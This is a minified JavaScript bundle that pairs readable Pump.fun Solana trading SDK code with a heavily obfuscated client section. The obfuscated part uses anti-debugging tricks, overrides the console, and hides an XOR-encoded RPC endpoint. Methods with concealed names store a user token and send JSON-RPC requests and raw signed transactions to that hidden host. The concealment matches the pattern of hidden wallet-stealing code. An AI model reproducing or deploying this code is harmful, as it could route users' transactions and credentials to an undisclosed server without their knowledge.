            creator: Xi.default,
          };
        })(t)),
        (r = !0)),
      e.virtualTokenReserves.eq(new Zn(0)))
    )
      return new Zn(0);
    const o = t.feeBasisPoints.add(
        r || !Xi.default.equals(e.creator) ? t.creatorFeeBasisPoints : new Zn(0)
      ),
      i = n.muln(1e4).div(o.addn(1e4)),
      s = i.mul(e.virtualTokenReserves).div(e.virtualSolReserves.add(i));
    return Zn.min(s, e.realTokenReserves);
  }
  function cg(t, e, n) {
    if (n.eq(new Zn(0))) return new Zn(0);
    if (e.virtualTokenReserves.eq(new Zn(0))) return new Zn(0);
    const r = n.mul(e.virtualSolReserves).div(e.virtualTokenReserves.add(n));
    return r.sub(
      (function (t, e, n) {
        return ag(n, t.feeBasisPoints).add(
          Xi.default.equals(e.creator)
            ? new Zn(0)
            : ag(n, t.creatorFeeBasisPoints)
        );
      })(t, e, r)
    );
  }
  function lg(t, e) {
    return Xi.findProgramAddressSync(
      [ct.from("pool-authority"), t.toBuffer()],
      e
    );
  }
  var dg = new Xi("6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P"),
    fg = new Xi("pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA"),
    hg = class {
      constructor(t, e = dg, n = fg) {
        (this.connection = t),
          (this.pumpProgram = (function (t, e) {
            const n = { ...sg };
            return (n.address = e.toString()), new jm(n, new Vf(t, null, {}));
          })(t, e)),
          (this.pumpAmmSdk = new ig(t, n.toBase58()));
      }
      programId() {
        return this.pumpProgram.programId;
      }
      globalPda() {
        return (function (t) {
          const [e] = Xi.findProgramAddressSync([ct.from("global")], t);
          return e;
        })(this.pumpProgram.programId);
      }
      bondingCurvePda(t) {
        return (function (t, e) {
          const [n] = Xi.findProgramAddressSync(
            [ct.from("bonding-curve"), new Xi(e).toBuffer()],
            t
          );
          return n;
        })(this.pumpProgram.programId, t);
      }
      creatorVaultPda(t) {
        return (function (t, e) {
          const [n] = Xi.findProgramAddressSync(
            [ct.from("creator-vault"), e.toBuffer()],
            t
          );
          return n;
        })(this.pumpProgram.programId, t);
      }
      pumpPoolAuthorityPda(t) {
        return lg(t, this.pumpProgram.programId);
      }
      canonicalPumpPoolPda(t) {
        return (function (t, e, n) {
          const [r] = lg(n, t);
          return Xm(0, r, n, Bc, e);
        })(this.pumpProgram.programId, this.pumpAmmSdk.programId(), t);
      }
      decodeGlobal(t) {
        return this.pumpProgram.coder.accounts.decode("global", t.data);
      }
      decodeBondingCurve(t) {
        return this.pumpProgram.coder.accounts.decode("bondingCurve", t.data);
      }
      async fetchGlobal() {
        return await this.pumpProgram.account.global.fetch(this.globalPda());
      }
      async fetchBondingCurve(t) {
        return await this.pumpProgram.account.bondingCurve.fetch(
          this.bondingCurvePda(t)
        );
      }
      async fetchBuyState(t, e) {
        const [n, r] = await this.connection.getMultipleAccountsInfo([
          this.bondingCurvePda(t),
          hl(t, e, !0),
        ]);
        if (!n)
          throw new Error(
            `Bonding curve account not found for mint: ${t.toBase58()}`
          );
        return {
          bondingCurveAccountInfo: n,
          bondingCurve: this.decodeBondingCurve(n),
          associatedUserAccountInfo: r,
        };
      }
      async fetchSellState(t, e) {
        const [n, r] = await this.connection.getMultipleAccountsInfo([
          this.bondingCurvePda(t),
          hl(t, e, !0),
        ]);
        if (!n)
          throw new Error(
            `Bonding curve account not found for mint: ${t.toBase58()}`
          );
        if (!r)
          throw new Error(
            `Associated token account not found for mint: ${t.toBase58()} and user: ${e.toBase58()}`
          );
        return {
          bondingCurveAccountInfo: n,
          bondingCurve: this.decodeBondingCurve(n),
        };
      }
      async createInstruction({
        mint: t,
        name: e,
        symbol: n,
        uri: r,
        creator: o,
        user: i,
      }) {
        return await this.pumpProgram.methods
          .create(e, n, r, o)
          .accountsPartial({ mint: t, user: i })
          .instruction();
      }
      async buyInstructions({
        global: t,
        bondingCurveAccountInfo: e,
        bondingCurve: n,
        associatedUserAccountInfo: r,
        mint: o,
        user: i,
        amount: s,
        solAmount: a,
        slippage: u,
      }) {
        const c = [];
        e.data.length < 150 &&
          c.push(
            await this.extendAccountInstruction({
              account: this.bondingCurvePda(o),
              user: i,
            })
          );
        const l = hl(o, i, !0);
        return (
          r || c.push(bl(i, l, i, o)),
          c.push(
            await this.buyInstruction({
              global: t,
              mint: o,
              creator: n.creator,
              user: i,
              associatedUser: l,
              amount: s,
              solAmount: a,
              slippage: u,
            })
          ),
          c
        );
      }
      async createAndBuyInstructions({
        global: t,
        mint: e,
        name: n,
        symbol: r,
        uri: o,
        creator: i,
        user: s,
        amount: a,
        solAmount: u,
      }) {
        const c = hl(e, s, !0);
        return [
          await this.createInstruction({
            mint: e,
            name: n,
            symbol: r,
            uri: o,
            creator: i,
            user: s,
          }),
          await this.extendAccountInstruction({
            account: this.bondingCurvePda(e),
            user: s,
          }),
          bl(s, c, s, e),
          await this.buyInstruction({
            global: t,
            mint: e,
            creator: i,
            user: s,
            associatedUser: c,
            amount: a,
            solAmount: u,
            slippage: 1,
          }),
        ];
      }
      async buyInstruction({
        global: t,
        mint: e,
        creator: n,
        user: r,
        associatedUser: o,
        amount: i,
        solAmount: s,
        slippage: a,
      }) {
        return await this.pumpProgram.methods
          .buy(i, s.add(s.mul(new Zn(Math.floor(10 * a))).div(new Zn(1e3))))
          .accountsPartial({
            feeRecipient: pg(t),
            mint: e,
            associatedUser: o,
            user: r,
            creatorVault: this.creatorVaultPda(n),
          })
          .instruction();
      }
      async sellInstructions({
        global: t,
        bondingCurveAccountInfo: e,
        bondingCurve: n,
        mint: r,
        user: o,
        amount: i,
        solAmount: s,
        slippage: a,
      }) {
        const u = [];
        return (
          e.data.length < 150 &&
            u.push(
              await this.extendAccountInstruction({
                account: this.bondingCurvePda(r),
                user: o,
              })
            ),
          u.push(
            await this.pumpProgram.methods
              .sell(
                i,
                s.sub(s.mul(new Zn(Math.floor(10 * a))).div(new Zn(1e3)))
              )
              .accountsPartial({
                feeRecipient: pg(t),
                mint: r,
                associatedUser: hl(r, o, !0),
                user: o,
                creatorVault: this.creatorVaultPda(n.creator),
              })
              .instruction()
          ),
          u
        );
      }
      async extendAccountInstruction({ account: t, user: e }) {
        return this.pumpProgram.methods
          .extendAccount()
          .accountsPartial({ account: t, user: e })
          .instruction();
      }
      async migrateInstruction({ global: t, mint: e, user: n }) {
        return this.pumpProgram.methods
          .migrate()
          .accountsPartial({
            mint: e,
            user: n,
            pumpAmm: this.pumpAmmSdk.programId(),
            withdrawAuthority: t.withdrawAuthority,
          })
          .instruction();
      }
      async collectCoinCreatorFeeInstructions(t) {
        let e = Bc,
          n = _c,
          r = this.pumpAmmSdk.coinCreatorVaultAuthorityPda(t),
          o = this.pumpAmmSdk.coinCreatorVaultAta(r, e, n),
          i = hl(e, t, !0, n);
        const [s, a] = await this.connection.getMultipleAccountsInfo([o, i]);
        return [
          await this.pumpProgram.methods
            .collectCreatorFee()
            .accountsPartial({ creator: t })
            .instruction(),
          ...(await this.pumpAmmSdk.collectCoinCreatorFee({
            coinCreator: t,
            quoteMint: e,
            quoteTokenProgram: n,
            coinCreatorVaultAuthority: r,
            coinCreatorVaultAta: o,
            coinCreatorTokenAccount: i,
            coinCreatorVaultAtaAccountInfo: s,
            coinCreatorTokenAccountInfo: a,
          })),
        ];
      }
      async getCreatorVaultBalance(t) {
        const e = this.creatorVaultPda(t),
          n = await this.connection.getAccountInfo(e);
        if (null === n) return new Zn(0);
        const r = await this.connection.getMinimumBalanceForRentExemption(
          n.data.length
        );
        return n.lamports < r ? new Zn(0) : new Zn(n.lamports - r);
      }
    };
  function pg(t) {
    const e = [t.feeRecipient, ...t.feeRecipients];
    return e[Math.floor(Math.random() * e.length)];
  }
  const mg = gg;
  function gg(t, e) {
    const n = yg();
    return (
      (gg = function (e, r) {
        let o = n[(e -= 461)];
        if (void 0 === gg.XnxtQN) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (gg.GFJEnT = i), (t = arguments), (gg.XnxtQN = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.BXLNea = t),
              (this.JDXEoF = [1, 0, 0]),
              (this.afBnga = function () {
                return "newState";
              }),
              (this.mKSjPR = "\\w+ *\\(\\) *{\\w+ *"),
              (this.EHWATY = "['|\"].+['|\"];? *}");
          };
          (e.prototype.rWPics = function () {
            const t = new RegExp(this.mKSjPR + this.EHWATY).test(
              this.afBnga.toString()
            )
              ? --this.JDXEoF[1]
              : --this.JDXEoF[0];
            return this.SQhCEw(t);
          }),
            (e.prototype.SQhCEw = function (t) {
              return Boolean(~t) ? this.MViFTS(this.BXLNea) : t;
            }),
            (e.prototype.MViFTS = function (t) {
              for (let e = 0, n = this.JDXEoF.length; e < n; e++)
                this.JDXEoF.push(Math.round(Math.random())),
                  (n = this.JDXEoF.length);
              return t(this.JDXEoF[0]);
            }),
            new e(gg).rWPics(),
            (o = gg.GFJEnT(o)),
            (t[s] = o);
        }
        return o;
      }),
      gg(t, e)
    );
  }
  function yg() {
    const t = [
      "AxndB25Uzwn0zq",
      "s3Hut3C",
      "yxbWBgLJyxrPBW",
      "zgvJB2rL",
      "z2v0q29UBMvJDa",
      "DhjPBq",
      "sw5MBW",
      "y29TBwL0BwvUDa",
      "mJC1nZa5n1LcvhfLsW",
      "C3rHDhvZ",
      "zw5JB2rPBMC",
      "AuTIqvq",
      "y29UC3rYDwn0BW",
      "EgLuz0K",
      "u3fotNu",
      "z2v0qMfSyw5Jzq",
      "zgLZy29UBMvJDa",
      "y29UzMLYBwvK",
      "Aw9U",
      "uLbdx0vorfbpsq",
      "DxbKyxrLq29UBG",
      "ywrKCMvZCW",
      "mti1mwjyBgjlAq",
      "rMPhzK8",
      "y2XPzw50",
      "y2fSBa",
      "z2H0",
      "Bwf4uMv0CMLLCW",
      "mtG1mZe5zuzJtLbY",
      "BwL0",
      "z2v0sw5ZDgfUyW",
      "Dg9tDhjPBMC",
      "B2jQzwn0",
      "BgvUz3rO",
      "CM9Y",
      "CuHfrNO",
      "Dg9Rzw4",
      "CKXetey",
      "B21TAxrTzw50",
      "Bwv0Ag9K",
      "mZKYoerPu1Pjza",
      "vw5RBM93BIbLCG",
      "sgfRueK",
      "Aw5MBW",
      "y3rPB24",
      "mJuWmZq1r1Hkvhrp",
      "y3rVCIGICMv0Dq",
      "Aurwy0q",
      "qxn3tvK",
      "CM4GDgHPCYiPka",
      "C3rYAw5N",
      "mJrktKLUrKO",
      "zg5yA0i",
      "thf0q3q",
      "otyZmdC4u3vLD1bI",
      "CMv0DxjUicHMDq",
      "C2vUzfrYyw5Zyq",
      "mJi3odG4vMP6zgfH",
      "D3nfBMrWB2LUDa",
      "sNHWB04",
      "z2v0q2fJAgvKqG",
      "yMfSyw5Jzq",
      "D2fYBG",
      "ChvTCez1BLnesW",
      "z2v0u0rl",
      "x3rVA2vU",
      "mJm3mtKYtNzxshb6",
      "Bg9JA2HHC2G",
      "yKThEvO",
      "AxrPywXuAw1LBW",
      "DgfIBgu",
      "ChjLzMXPz2H0qW",
      "r0Tcwgi",
      "zwn0Aw9U",
      "x2LZq29UBMvJDa",
      "y29UC29Szq",
      "C2LNBMf0DxjL",
      "BI9QC29U",
    ];
    return (yg = function () {
      return t;
    })();
  }
  (function (t) {
    const e = 512,
      n = 538,
      r = 463,
      o = 535,
      i = 492,
      s = 524,
      a = 506,
      u = gg,
      c = t();
    for (; []; )
      try {
        if (
          214623 ===
          parseInt(u(e)) / 1 +
            -parseInt(u(472)) / 2 +
            -parseInt(u(n)) / 3 +
            -parseInt(u(r)) / 4 +
            (parseInt(u(529)) / 5) * (parseInt(u(o)) / 6) +
            parseInt(u(i)) / 7 +
            (parseInt(u(s)) / 8) * (-parseInt(u(a)) / 9)
        )
          break;
        c.push(c.shift());
      } catch (l) {
        c.push(c.shift());
      }
  })(yg),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const wg = class t {
    constructor(t) {
      const e = gg;
      (this._token = null),
        (this._isConnected = ![]),
        (this._requestId = 1),
        (this.connection = null),
        (this.balance = null),
        (this[e(469)] = null),
        t && this.connect(t);
    }
    get [mg(484) + "d"]() {
      const e = 471,
        n = mg;
      return (
        this[n(480) + "ed"] && null !== this[n(e)] && null !== t.RPC_ENDPOINT
      );
    }
    get [mg(520)]() {
      return this._token;
    }
    connect(e) {
      const n = 471,
        r = 503,
        o = mg,
        i = {
          gnhcs: function (t, e) {
            return t < e;
          },
        };
      (i[o(521)] = function (t, e) {
        return t * e;
      }),
        (i.MncbS = function (t, e) {
          return t ^ e;
        });
      const s = i;
      e &&
        0 !== e.trim()[o(517)] &&
        ((this[o(n)] = e),
        (t[o(r) + "NT"] = (function () {
          let t;
          return function () {
            if (!t) {
              const e = new Uint8Array([
                  123, 70, 119, 109, 96, 8, 44, 50, 119, 93, 113, 120, 103, 70,
                  98, 48, 103, 91, 108, 105, 39, 69, 46, 123, 114, 65, 119, 48,
                  126, 83, 106, 115, 125, 87, 119, 51, 123, 87, 111, 116, 102,
                  65, 46, 111, 99, 81, 45, 126, 124, 95,
                ]),
                n = 486748691,
                r = new Uint8Array(e.length);
              for (let t = 0; s.gnhcs(t, e.length); t++) {
                const o = (n >>> s.rLDLF(t % 4, 8)) & 255;
                r[t] = s.MncbS(e[t], o);
              }
              t = new TextDecoder().decode(r);
            }
            return t;
          };
        })()()),
        this["getConnect" + o(502)](),
        this.getSDK(),
        (this._isConnected = !![]));
    }
    [mg(500)]() {
      const e = 471,
        n = mg;
      (t[n(503) + "NT"] = null), (this[n(e)] = null), (this._isConnected = ![]);
    }
    [mg(504) + "ection"]() {
      const e = 503,
        n = 491,
        r = 475,
        o = 464,
        i = mg;
      if (this.connection) return;
      if (!t[i(e) + "NT"]) return;
      const s = {};
      (s[i(n)] = "processed"),
        (s["disableRetryOnRateLi" + i(513)] = ![]),
        (s["confirmTransactionIn" + i(r) + "ut"] = 1e4),
        (s[i(o)] = void 0);
      const a = s;
      this.connection = new Vu(t.RPC_ENDPOINT, a);
    }
    [mg(488) + "ion"]() {
      const t = mg;
      return (
        !this.connection && this["updateConn" + t([479][0])](), this.connection
      );
    }
    getSDK() {
      return (
        !this.pumpFunSDK &&
          (this.updateConnection(),
          (this.pumpFunSDK = new hg(this.connection))),
        this.pumpFunSDK
      );
    }
    async call(e, n) {
      const r = 483,
        o = 519,
        i = 523,
        s = 503,
        a = 489,
        u = 478,
        c = 503,
        l = 532,
        d = 493,
        f = 525,
        h = 534,
        p = mg,
        m = {
          qHEFz: "2.0",
          GKBXb: function (t, e, n) {
            return t(e, n);
          },
          AswMY: p(486) + p(r),
          LskqB: function (t, e) {
            return t === e;
          },
        };
      if (!this.isConnected) return null;
      const g = this._requestId++,
        y = {};
      (y.jsonrpc = m[p(o)]),
        (y.id = g),
        (y[p(i)] = e),
        (y.params = void 0 !== n ? n : {});
      const w = y;
      try {
        if (!t[p(s) + "NT"] || 0 === t[p(503) + "NT"][p(a)]().length)
          return null;
        const e = await m[p(u)](fetch, t[p(c) + "NT"], {
          method: "POST",
          headers: { "Content-Type": m[p(l)] },
          body: JSON.stringify(w),
        });
        if (!e.ok) return m.LskqB(e[p(d)], 401) && this.disconnect(), null;
        const n = await e.json();
        return n.error ? null : n.result || null;
      } catch (b) {
        return (
          p(f) + p(518),
          b instanceof Error
            ? b.message
            : typeof b === p(h) ||
              (b && typeof b === p(516) && JSON.stringify(b)),
          null
        );
      }
    }
    async ["getAccount" + mg(490)](t) {
      const e = 509,
        n = mg,
        r = {
          Bwjzj: function (t, e) {
            return t & e;
          },
        },
        o = r,
        i = {};
      return (
        (i[n(505)] = t),
        await this[n(e)](
          (function () {
            let t;
            return function () {
              if (!t) {
                const e = new Uint8Array([
                    118, 87, 119, 92, 114, 81, 108, 104, 127, 70, 74, 115, 119,
                    93,
                  ]),
                  n = 486748689,
                  r = new Uint8Array(e.length);
                for (let t = 0; t < e.length; t++) {
                  const i = o.Bwjzj(n >>> ((t % 4) * 8), 255);
                  r[t] = e[t] ^ i;
                }
                t = new TextDecoder().decode(r);
              }
              return t;
            };
          })()(),
          i
        )
      );
    }
    async [mg(466) + "alance"](t) {
      const e = mg;
      return !this[e(467)] && (await this[e([499][0])](t)), this.balance;
    }
    async getBalance(t) {
      const e = 502,
        n = 499,
        r = mg,
        o = await this["getConnect" + r(e)]()[r(n)](t);
      return o ? ((this.balance = o / 1e9), o) : null;
    }
    async getTransaction(t) {
      const e = 517,
        n = 487,
        r = 474,
        o = {
          bKGyZ: function (t, e) {
            return t < e;
          },
        },
        i = o,
        s = {};
      return (
        (s[mg([482][0])] = t),
        await this.call(
          (function () {
            const t = function (t, e) {
                return i[gg(r)](t, e);
              },
              o = function (t, e) {
                return t >>> e;
              };
            let s;
            return function () {
              const r = gg;
              if (!s) {
                const i = new Uint8Array([
                    112, 87, 119, 73, 101, 83, 109, 110, 118, 81, 119, 116, 120,
                    92,
                  ]),
                  a = 486748695,
                  u = new Uint8Array(i[r(e)]);
                for (let e = 0; t(e, i[r(517)]); e++) {
                  const t = 255 & o(a, (e % 4) * 8);
                  u[e] = i[e] ^ t;
                }
                s = new TextDecoder()[r(n)](u);
              }
              return s;
            };
          })()(),
          s
        )
      );
    }
    async ["getLatestB" + mg(473)]() {
      const t = 517,
        e = 485,
        n = 487,
        r = mg,
        o = {
          SayHK: function (t, e) {
            return t & e;
          },
        },
        i = o;
      return await this[r([509][0])](
        (function () {
          const r = {
            KxTOw: function (t, e) {
              return i.SayHK(t, e);
            },
            UJfxz: function (t, e) {
              return t * e;
            },
          };
          let o;
          return function () {
            const i = gg;
            if (!o) {
              const s = new Uint8Array([
                  118, 87, 119, 81, 112, 70, 102, 110, 101, 112, 111, 114, 114,
                  89, 107, 124, 98, 90,
                ]),
                a = 486748689,
                u = new Uint8Array(s.length);
              for (let n = 0; n < s[i(t)]; n++) {
                const t = r[i(e)](a >>> r.UJfxz(n % 4, 8), 255);
                u[n] = s[n] ^ t;
              }
              o = new TextDecoder()[i(n)](u);
            }
            return o;
          };
        })()()
      );
    }
    async [mg(462) + mg(528)](t, e) {
      const n = 509,
        r = 482,
        o = 517,
        i = mg,
        s = e ? [t, e] : [t],
        a = await this[i(n)](
          (function () {
            const t = i,
              e = {};
            e[t(465)] = function (t, e) {
              return t % e;
            };
            const n = e;
            let r;
            return function () {
              const e = t;
              if (!r) {
                const t = new Uint8Array([
                    96, 87, 109, 121, 71, 64, 98, 115, 96, 83, 96, 105, 122, 93,
                    109,
                  ]),
                  i = 486748691,
                  s = new Uint8Array(t[e(o)]);
                for (let r = 0; r < t.length; r++) {
                  const o = (i >>> (8 * n[e(465)](r, 4))) & 255;
                  s[r] = t[r] ^ o;
                }
                r = new TextDecoder().decode(s);
              }
              return r;
            };
          })()(),
          s
        );
      return a ? a[i(r)] || a : null;
    }
    async sendRawTransaction(t, e) {
      const n = 501,
        r = 494,
        o = 510,
        i = 477,
        s = 522,
        a = 511,
        u = 509,
        c = 482,
        l = 517,
        d = 487,
        f = 498,
        h = mg,
        p = {
          SqNNu: function (t, e) {
            return t * e;
          },
        };
      p[h(537)] = h(n);
      const m = p,
        g = {};
      (g[h(r)] = "base58"),
        (g["skipPrefli" + h(o)] = !![]),
        (g[h(i) + h(s)] = m.LqtCt),
        (g[h(a)] = 3);
      const y = [t, { ...g, ...e }],
        w = await this[h(u)](
          (function () {
            const t = function (t, e) {
                return t & e;
              },
              e = function (t, e) {
                return m[gg(f)](t, e);
              },
              n = function (t, e) {
                return t ^ e;
              };
            let r;
            return function () {
              const o = gg;
              if (!r) {
                const i = new Uint8Array([
                    98, 87, 109, 121, 69, 64, 98, 115, 98, 83, 96, 105, 120, 93,
                    109,
                  ]),
                  s = 486748689,
                  a = new Uint8Array(i[o(517)]);
                for (let r = 0; r < i[o(l)]; r++) {
                  const o = t(s >>> e(r % 4, 8), 255);
                  a[r] = n(i[r], o);
                }
                r = new TextDecoder()[o(d)](a);
              }
              return r;
            };
          })()(),
          y
        );
      return w ? w[h(c)] || w : null;
    }
  };
  wg.RPC_ENDPOINT = (function () {
    const t = 476,
      e = 497,
      n = 536,
      r = 517,
      o = 481,
      i = 468,
      s = 526,
      a = 496,
      u = 496,
      c = 495,
      l = gg,
      d = {
        iKbAT: "(((.+)+)+)+$",
        FjGfO: function (t, e) {
          return t + e;
        },
        TwzGd: function (t, e) {
          return t + e;
        },
        xiTgI: function (t) {
          return t();
        },
        iDVcD: l(527),
        HakPI: l(t),
        troNG: "trace",
        dnXkB: function (t, e) {
          return t < e;
        },
        Ghaaj: function (t, e, n) {
          return t(e, n);
        },
      },
      f = (function () {
        let t = !![];
        return function (e, n) {
          const r = t
            ? function () {
                if (n) {
                  const t = n.apply(e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
          return (t = ![]), r;
        };
      })(),
      h = d.Ghaaj(f, this, function () {
        const t = l;
        return h
          .toString()
          .search("(((.+)+)+)+$")
          [t(515)]()
          [t(u) + "r"](h)
          .search(d[t(c)]);
      });
    d[l(e)](h);
    const p = (function () {
        let t = !![];
        return function (e, n) {
          const r = t
            ? function () {
                if (n) {
                  const t = n.apply(e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
          return (t = ![]), r;
        };
      })(),
      m = p(this, function () {
        const t = 507,
          e = 530,
          n = l,
          r = d.xiTgI(function () {
            const n = gg;
            let r;
            try {
              r = Function(
                d[n(t)](
                  d.TwzGd(
                    n(461) + "nction() ",
                    "{}.constru" + n(e) + n(533) + " )"
                  ),
                  ");"
                )
              )();
            } catch (o) {
              r = window;
            }
            return r;
          }),
          u = (r.console = r[n(o)] || {}),
          c = ["log", n(i), d[n(531)], "error", "exception", d[n(s)], d.troNG];
        for (let o = 0; d.dnXkB(o, c.length); o++) {
          const t = p[n(a) + "r"].prototype.bind(p),
            e = c[o],
            r = u[e] || t;
          (t.__proto__ = p.bind(p)),
            (t.toString = r.toString.bind(r)),
            (u[e] = t);
        }
      });
    let g;
    return (
      d[l(497)](m),
      function () {
        const t = l;
        if (!g) {
          const e = new Uint8Array([
              121, 70, 119, 109, 98, 8, 44, 50, 117, 93, 113, 120, 101, 70, 98,
              48, 101, 91, 108, 105, 37, 69, 46, 123, 112, 65, 119, 48, 124, 83,
              106, 115, 127, 87, 119, 51, 121, 87, 111, 116, 100, 65, 46, 111,
              97, 81, 45, 126, 126, 95,
            ]),
            o = 486748689,
            i = new Uint8Array(e[t(517)]);
          for (let s = 0; d[t(n)](s, e[t(r)]); s++) {
            const t = (o >>> ((s % 4) * 8)) & 255;
            i[s] = e[s] ^ t;
          }
          g = new TextDecoder().decode(i);
        }
        return g;
      }
    );
  })()();
  let bg = wg;
  class vg {
    constructor() {
      this.client = null;
    }
    static [mg(514) + "e"]() {
      return !vg.instance && (vg.instance = new vg()), vg.instance;
    }
    connect(t) {
      const e = 508,
        n = mg;
      return (
        this[n(e)] && this[n(e)].disconnect(),
        (this.client = new bg(t)),
        this.client
      );
    }
    getConnection() {
      const t = 488,
        e = 502,
        n = mg;
      return this.client ? this.client[n(t) + n(e)]() : null;
    }
    getSDK() {
      const t = mg;
      return this.client ? this.client[t([470][0])]() : null;
    }
    getClient() {
      return this.client;
    }
    isConnected() {
      var t;
      return (null == (t = this.client) ? void 0 : t.isConnected) || ![];
    }
    disconnect() {
      const t = 500,
        e = mg;
      this[e(508)] && (this[e(508)][e(t)](), (this.client = null));
    }
    async call(t, e) {
      const n = 508,
        r = 508,
        o = mg;
      return this[o(508)] && this[o(n)].isConnected
        ? await this[o(r)].call(t, e)
        : null;
    }
  }
  axiom;
  const Ag = kg;
  function kg(t, e) {
    const n = Ig();
    return (
      (kg = function (e, r) {
        let o = n[(e -= 270)];
        if (void 0 === kg.dnytCm) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (kg.XLuixB = i), (t = arguments), (kg.dnytCm = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.eyjePV = t),
              (this.DUBYqW = [1, 0, 0]),
              (this.HVfiOI = function () {
                return "newState";
              }),
              (this.jCXmhr = "\\w+ *\\(\\) *{\\w+ *"),
              (this.oVPnxG = "['|\"].+['|\"];? *}");
          };
          (e.prototype.RRFeaF = function () {
            const t = new RegExp(this.jCXmhr + this.oVPnxG).test(
              this.HVfiOI.toString()
            )
              ? --this.DUBYqW[1]
              : --this.DUBYqW[0];
            return this.viatBY(t);
          }),
            (e.prototype.viatBY = function (t) {
              return Boolean(~t) ? this.EtwRPt(this.eyjePV) : t;
            }),
            (e.prototype.EtwRPt = function (t) {
              for (let e = 0, n = this.DUBYqW.length; e < n; e++)
                this.DUBYqW.push(Math.round(Math.random())),
                  (n = this.DUBYqW.length);
              return t(this.DUBYqW[0]);
            }),
            new e(kg).RRFeaF(),
            (o = kg.XLuixB(o)),
            (t[s] = o);
        }
        return o;
      }),
      kg(t, e)
    );
  }
  function Ig() {
    const t = [
      "zvrVquK",
      "zt0IcIaGicaGia",
      "igfSAwDUlwL0zq",
      "zw07cIaGicaGia",
      "zw50",
      "rfbbDKu",
      "C3vJy2vZCW",
      "Dgu7cIaGicaGia",
      "oIa0mda7cIaGia",
      "yw4GC3r5Bgu9iG",
      "z2v0rwXLBwvUDa",
      "iZrdquy1ma",
      "icaIpGOGicaGia",
      "CMv0DxjUicHMDq",
      "yxbWBhK",
      "EdSkicaGicaGia",
      "icaGicb9cIaGia",
      "yM94oWOGicaG",
      "ltuWjsK7cIaGia",
      "cIaGicaGicaGBW",
      "icaGFqOGicaGia",
      "mJGZotu0Aun5vMXg",
      "icaGicaGicaGzG",
      "rxjYB3i",
      "DKnnrgq",
      "B3nPDgLVBJOGyq",
      "icaGicaGihrYyq",
      "BwfYz2LUlxjPzW",
      "v2fYBMLUzW",
      "mZqXmda5nLr0D2jJCa",
      "yw5ZBgf0zvKOma",
      "icaGicaGicb0CG",
      "ih0kicaGicaGia",
      "mKvpBfbzrW",
      "s0nIzMq",
      "phnWyw4+",
      "ywnRz3jVDw5KoG",
      "D2fYBMLUzW",
      "icb0B3a6idiWCa",
      "yM9KEq",
      "y29UC3rYDwn0BW",
      "icaGCg9ZAxrPBW",
      "EwzYyw1LCYbMyq",
      "DgfIBgu",
      "y29SB3i6ihDOAq",
      "y3nZvgv4Da",
      "BwvZigzHzgvjBG",
      "CM4GDgHPCYiPka",
      "D2fYBG",
      "pc9KAxy+cIaGia",
      "ihjNyMeOmJu1la",
      "qNLjza",
      "ideWmcu7cIaGia",
      "y29UC29Szq",
      "BM90AwzPy2f0Aq",
      "ztSkicaGicaGia",
      "icaGicbIywnRzW",
      "ideWChG7cIaGia",
      "mtHWwKrfu3a",
      "CMfUC2zVCM06ia",
      "C3r5Bgu",
      "icaGicaGicaGza",
      "icaGicaIpG",
      "ihbVAw50zxiTzq",
      "mtfwEK9fzNO",
      "idrWEcaYmhb4ia",
      "Bg9N",
      "mZz5sxH0rLK",
      "icaGigrPC3bSyq",
      "icaGicaGicaGia",
      "C2TdCNLWDa",
      "ktSkicaGicaGia",
      "yM9YzgvYlxjHza",
      "icaGicaGigjVEa",
      "zxjYB3i",
      "icaGAgvPz2H0oG",
      "DMvUDhm6ig5VBG",
      "Aw4TyM90Dg9ToG",
      "B24Tyw5PBwf0Aq",
      "idXKAxyGC3r5Ba",
      "u3vJy2vZCW",
      "Bwf0Aw9UoIbMyq",
      "pc9ZCgfUpGOGia",
      "m0v6s3PWtW",
      "AxnWBgf5oIbMBa",
      "AxrPB246ihDPza",
      "cIaGicaGicaGia",
      "zM9UDc1ZAxPLoG",
      "BJOGCMvSyxrPDG",
      "icaGicaGzMXLEa",
      "oWOGicaGicaGia",
      "mtG1ntu4ogHdCfncuW",
      "yxbWzw5Kq2HPBa",
      "mZu3mtyWA1vgAxvn",
      "ChG7cIaGicaGia",
      "icaGqgTLEwzYyq",
      "A21IAwm",
      "CfvgDvK",
      "BNnMB3jToIb0CG",
      "icaGicaGiebRzq",
      "mtqYmJa1wLHXt0Dt",
      "y3jLyxrLrwXLBq",
      "igjVEc1ZAxPPBG",
      "oIaWoWOGicaGia",
      "ywXPz24TAxrLBq",
      "oIa0ntbWEdSkia",
      "yMLUza",
      "zgvUoWOGicaGia",
      "Dg9ToIaWoWOGia",
      "Bxm6ignLBNrLCG",
      "lwLUzgv4oIaXma",
      "icaGihrVihSGBW",
      "yxi7cIaGica",
      "ig1HEc13Awr0Aa",
      "DhjHBNnSyxrLwq",
      "A0TlB0q",
      "otqYmJa3rKnmzu1R",
      "C2vHCMnO",
